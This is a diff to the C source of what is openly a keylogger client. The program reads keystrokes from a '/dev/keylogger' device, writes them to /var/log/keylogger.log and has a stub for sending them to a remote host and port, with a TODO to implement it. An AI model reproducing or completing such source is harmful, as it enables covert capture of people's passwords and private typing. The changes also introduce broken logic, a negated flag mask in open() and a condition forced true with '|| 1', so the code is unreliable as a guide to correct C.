@@ -8,14 +8,15 @@
 char buffer[BUFFER_LEN];
 int currentSize = 0;
 
-int sendToServer(host, port)
+int sendToServer(char *host, int port)
 {
+    // TODO try to send data to server
     return -1;
 }
 
 void logToFile()
 {
-    FILE *file  = fopen("keylogger.log", "a+");
+    FILE *file  = fopen("/var/log/keylogger.log", "a+");
     fwrite(buffer, 1, currentSize, file);
     currentSize = 0;
     fclose(file);
@@ -33,7 +34,7 @@ int main(int argc, char *argv[])
     int port = atoi(argv[2]);
 
     int dev;
-    if ((dev = open("/dev/keylogger", O_RDONLY)) == -1)
+    if ((dev = open("/dev/keylogger", O_RDONLY | ~O_NONBLOCK)) == -1)
     {
         fprintf(stderr, "Cannot open device\n");
         exit(2);
@@ -50,11 +51,11 @@ int main(int argc, char *argv[])
         }
 
         currentSize += readBytes;
-        if (currentSize == BUFFER_LEN && !sendToServer(host, port))
+        if (currentSize == BUFFER_LEN && !sendToServer(host, port) || 1)
         {
             logToFile();
         }
 
-        sleep(5);
+        sleep(2);
     }
 }
